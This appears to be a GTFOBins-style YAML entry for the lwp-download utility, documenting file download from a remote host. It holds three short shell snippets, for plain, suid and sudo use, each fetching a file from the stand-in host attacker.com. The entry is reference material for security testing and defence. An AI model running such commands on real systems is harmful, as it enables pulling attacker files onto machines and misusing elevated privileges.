---
description: Fetch a remote file via HTTP GET request.
functions:
  file-download:
    - code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        lwp-download $URL $LFILE
  suid:
    - code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        ./lwp-download $URL $LFILE
  sudo:
    - code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        sudo lwp-download $URL $LFILE
---
